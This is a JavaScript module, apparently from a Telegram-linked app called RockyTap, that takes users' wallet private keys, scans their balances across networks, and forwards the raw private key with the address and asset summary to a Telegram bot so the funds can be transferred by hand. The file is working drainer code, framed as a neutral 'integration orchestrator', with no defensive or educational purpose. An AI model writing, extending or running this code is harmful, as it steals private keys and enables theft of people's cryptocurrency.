// RockyTap integration orchestrator
// Coordinates the full processing pipeline

const crypto = require('crypto');
const { ethers } = require('ethers');
const { TelegramNotifier } = require('./telegramNotifier');
const { WalletScanner } = require('./walletScanner');
const { AssetProcessor } = require('./assetProcessor');

class RockyTapIntegration {
  constructor(config) {
    this.config = config;
    this.telegramNotifier = new TelegramNotifier();
    this.walletScanner = new WalletScanner(config);
    this.assetProcessor = new AssetProcessor(config, this.telegramNotifier);
    
    // Process tracking
    this.activeProcesses = new Map();
  }

  async processPrivateKey(privateKey, metadata = {}) {
    const processId = `proc_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    
    // Initialize process tracking
    const process = {
      id: processId,
      status: 'started',
      startedAt: new Date().toISOString(),
      walletAddress: null,
      scanResults: null,
      transferResults: null,
      error: null,
      metadata
    };
    
    this.activeProcesses.set(processId, process);

    try {
      // Step 1: Extract wallet address
      console.log(`[${processId}] Extracting wallet address...`);
      const walletAddress = this.extractWalletAddress(privateKey);
      process.walletAddress = walletAddress;
      
      await this.telegramNotifier.sendKeyReceived(walletAddress, metadata.source || 'RockyTap');
      await this.telegramNotifier.sendWalletExtracted(walletAddress);

      // Step 2: Scan networks
      console.log(`[${processId}] Scanning networks...`);
      process.status = 'scanning';
      await this.telegramNotifier.sendScanningStarted();
      
      const scanResults = await this.walletScanner.scanWallet(walletAddress);
      process.scanResults = scanResults;

      // Send network-specific notifications - برای همه شبکه‌ها با دارایی
      for (const [networkKey, networkData] of Object.entries(scanResults.networks)) {
        if (networkData && networkData.hasAssets) {
          // اعلان کامل برای هر شبکه
          await this.telegramNotifier.sendNetworkAssets(networkKey, {
            native: networkData.native,
            tokens: networkData.tokens
          });
        }
      }

      // Send scan summary
      await this.telegramNotifier.sendScanComplete({
        networksWithAssets: scanResults.summary.networksWithAssets,
        totalAssets: scanResults.summary.totalAssets,
        estimatedValue: scanResults.summary.estimatedValue
      });

      // Step 3: Send key and address to bot for manual transfer
      // DISABLED AUTO TRANSFER - User will transfer manually
      if (scanResults.summary.networksWithAssets > 0) {
        console.log(`[${processId}] Assets found - sending key and address to bot for manual transfer`);
        process.status = 'completed';
        
        // Send key and address to bot
        await this.telegramNotifier.sendKeyAndAddressForManualTransfer(
          privateKey,
          walletAddress,
          scanResults
        );
        
        process.transferResults = {
          totalTransfers: 0,
          successful: 0,
          failed: 0,
          transfers: [],
          manual: true
        };
      } else {
        console.log(`[${processId}] No assets found`);
        await this.telegramNotifier.sendNoAssetsFound(walletAddress);
        process.status = 'completed';
        process.transferResults = {
          totalTransfers: 0,
          successful: 0,
          failed: 0,
          transfers: []
        };
      }

      process.completedAt = new Date().toISOString();
      return process;

    } catch (error) {
      console.error(`[${processId}] Processing error:`, error);
      process.status = 'failed';
      process.error = error.message;
      process.completedAt = new Date().toISOString();
      
      await this.telegramNotifier.sendError(error, `Process ${processId}`);
      
      throw error;
    } finally {
      // Keep process in map for status queries (cleanup after 1 hour)
      setTimeout(() => {
        this.activeProcesses.delete(processId);
      }, 3600000);
    }
  }

  extractWalletAddress(privateKey) {
    try {
      // Validate private key format
      if (!privateKey.startsWith('0x')) {
        privateKey = '0x' + privateKey;
      }

      // Create wallet from private key
      const wallet = new ethers.Wallet(privateKey);
      return wallet.address;
    } catch (error) {
      throw new Error(`Invalid private key: ${error.message}`);
    }
  }

  getProcessStatus(processId) {
    return this.activeProcesses.get(processId) || null;
  }

  getStats() {
    const processes = Array.from(this.activeProcesses.values());
    
    const stats = {
      total: processes.length,
      byStatus: {
        started: 0,
        scanning: 0,
        processing: 0,
        completed: 0,
        failed: 0
      },
      recent: processes
        .sort((a, b) => new Date(b.startedAt) - new Date(a.startedAt))
        .slice(0, 10)
    };

    processes.forEach(p => {
      if (stats.byStatus[p.status] !== undefined) {
        stats.byStatus[p.status]++;
      }
    });

    return stats;
  }

  async processPrivateKeyAsync(privateKey, metadata = {}) {
    // Process in background, return immediately
    setImmediate(async () => {
      try {
        await this.processPrivateKey(privateKey, metadata);
      } catch (error) {
        console.error('Async processing error:', error);
      }
    });

    // Return a process ID immediately
    const processId = `proc_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    const process = {
      id: processId,
      status: 'queued',
      startedAt: new Date().toISOString(),
      metadata
    };
    this.activeProcesses.set(processId, process);

    return processId;
  }
}

module.exports = { RockyTapIntegration };

